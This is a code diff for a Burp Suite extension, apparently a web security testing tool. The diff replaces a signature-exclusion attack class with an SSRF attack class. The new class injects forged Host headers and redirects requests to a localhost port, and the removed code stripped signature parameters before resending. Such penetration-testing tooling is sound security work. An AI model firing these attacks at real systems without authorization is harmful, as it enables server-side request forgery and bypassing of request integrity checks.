@@ -24,8 +24,7 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.core.JsonProcessingException;
 import java.io.IOException;
 
-
-public class SignatureExcl {
+public class SSRFAttack {
 
     private static PrintWriter stdout;
     private final IBurpExtenderCallbacks callbacks;
@@ -40,7 +39,7 @@ public class SignatureExcl {
 
     private byte[] updateMessage;
 
-    public SignatureExcl(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){
+    public SSRFAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){
 
         this.callbacks = callbacks;
         this.helpers = callbacks.getHelpers();
@@ -48,103 +47,63 @@ public class SignatureExcl {
         this.requestInfo = helpers.analyzeRequest(message);
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
         this.httpService = message.getHttpService();
-
-
     }
 
-
-    public void signatureAttack(){
-
-
-//        String request = new String(requestResponse.getRequest());
-//        String messageBody = request.substrin
-//        g(requestInfo.getBodyOffset());
-//        byte[] updateMessage = helpers.buildHttpMessage(requestInfo.getHeaders(), messageBody.getBytes());
-//        requestResponse.setRequest(updateMessage);
-
-        List headers = requestInfo.getHeaders();
-        headers.add("Test: BurpExHeader");
+    public void hostheaderAttack(String modText){
+        loggerInstance.log(getClass(), "Executing Host Header SSRF Attack"  , Logger.LogLevel.INFO);
+        List<String> headers = requestInfo.getHeaders();
         String request = new String(requestResponse.getRequest());
         String messageBody = request.substring(requestInfo.getBodyOffset());
-        stdout.println(requestInfo.getUrl());
-        stdout.println(messageBody);
-        for (IParameter param : requestInfo.getParameters()) {
-            // parameter with empty signature
-            if (param.getName().matches("sg")) {
-                requestResponse.setHighlight("red");
-                flag = true;
+        int i = 0;
+        int replaceid = 0;
+        for(String s: headers){
+            if(s.contains("Host")){
+                replaceid = i;
             }
+            i++;
         }
 
-        if(flag) {
-            Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
-            List<Integer> pos = new ArrayList<Integer>();
-            while (m.find()) {
-                pos.add(m.start());
+        List<String> items = Arrays.asList(modText.split("\\s*,\\s*"));
+        i = 0;
+        // if more than one host are forwarded than enter for loop
+        if(items.size() > 1) {
+            for (String s : items) {
+                if(i == 1) {
+                    headers.set(replaceid, s);
+                } else{
+                    headers.add(replaceid+i, s);
+                }
+                i++;
             }
-
-            for(int n:pos) {
-                messageBody = modifyString(messageBody, (n-diff));
-            }
-            stdout.println("Performing Signature exclusion attack");
-            stdout.println(messageBody);
-            stdout.println(requestInfo.getUrl());
-            byte[] updateMessage = helpers.buildHttpMessage(requestInfo.getHeaders(), messageBody.getBytes());
-            requestResponse.setRequest(updateMessage);
-
-            IHttpService httpService = requestResponse.getHttpService();
-            callbacks.makeHttpRequest(httpService, requestResponse.getRequest());
-
-            stdout.println(requestResponse.getResponse());
+        } else{
+            headers.set(replaceid,modText);
         }
-    }
+        loggerInstance.log(getClass(), headers.toString()  , Logger.LogLevel.INFO);
 
-    public String modifyString(String msgStr, int indexStart){
-        String values = "0,0";
-        String tempStr = msgStr.substring(0,indexStart+5);
-        String truncatedStr = msgStr.substring(indexStart+6);
-        int y = truncatedStr.indexOf("]");
-        String remainStr = truncatedStr.substring(y);
-        tempStr = tempStr.concat(values).concat(remainStr);
-        diff = msgStr.length() - tempStr.length();
-        return tempStr;
-    }
-
-    public void autoAttackSigExcl(){
-        loggerInstance.log(getClass(), "Executing AutoMated Signature Exclusion Attack"  , Logger.LogLevel.INFO);
-        List headers = requestInfo.getHeaders();
-        String request = new String(requestResponse.getRequest());
-        String messageBody = request.substring(requestInfo.getBodyOffset());
-
-        stdout.println(messageBody);
-        Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
-        List<Integer> pos = new ArrayList<Integer>();
-        while (m.find()) {
-            pos.add(m.start());
-        }
-
-        for(int n:pos) {
-            messageBody = modifyString(messageBody, (n-diff));
-        }
         updateMessage = helpers.buildHttpMessage(headers, messageBody.getBytes());
         this.sendAttackReq();
     }
 
-    /**
-     * User edited message converted into request
-     * @param modText
-     * @return
-     */
 
-    public byte[] generateRequest(String modText){
-        List headers = requestInfo.getHeaders();
-        updateMessage = helpers.buildHttpMessage(headers, modText.getBytes());
-        return updateMessage;
+
+    public void protcolSmugAttack(String modText){
+        loggerInstance.log(getClass(), "Executing Protocol Smuggling SSRF Attack"  , Logger.LogLevel.INFO);
+        URL temp = requestInfo.getUrl();
+        List<String> headers = requestInfo.getHeaders();
+        String request = new String(requestResponse.getRequest());
+        String messageBody = request.substring(requestInfo.getBodyOffset());
+
+//        IHttpService httpService = requestResponse.getHttpService();
+        this.httpService = helpers.buildHttpService("127.0.0.1",8055,this.httpService.getProtocol());
+
+        updateMessage = helpers.buildHttpMessage(headers, messageBody.getBytes());
+        loggerInstance.log(getClass(), temp.toString()  , Logger.LogLevel.INFO);
+        this.sendAttackReq();
+
     }
 
-
     public void sendAttackReq(){
-        loggerInstance.log(getClass(), "Executing Signature Exclusion Attack"  , Logger.LogLevel.INFO);
+        loggerInstance.log(getClass(), "Executing SSRF Attack in the Background"  , Logger.LogLevel.INFO);
         AttackExecutor attackRequestExecutor = new AttackExecutor(updateMessage);
         attackRequestExecutor.execute();
     }
@@ -166,6 +125,7 @@ public class SignatureExcl {
         // Fire prepared request and return responses as IHttpRequestResponse
         protected IHttpRequestResponse doInBackground() {
             return callbacks.makeHttpRequest(httpService, attackRequest);
+//            return callbacks.makeHttpRequest("127.0.0.1",8055,false, this.attackRequest);
         }
 
         @Override
@@ -176,7 +136,7 @@ public class SignatureExcl {
             try {
                 requestResponse = get();
             } catch (InterruptedException | ExecutionException e) {
-                loggerInstance.log(SignatureExcl.class, "Failed to get request result: " + e.getMessage(), Logger.LogLevel.ERROR);
+                loggerInstance.log(SSRFAttack.class, "Failed to get request result: " + e.getMessage(), Logger.LogLevel.ERROR);
                 return;
             }
             // getting message from the response
@@ -186,8 +146,4 @@ public class SignatureExcl {
             loggerInstance.log(getClass(), "Attack Performed: " +messageBody , Logger.LogLevel.DEBUG);
         }
     }
-
-
-
-
 }
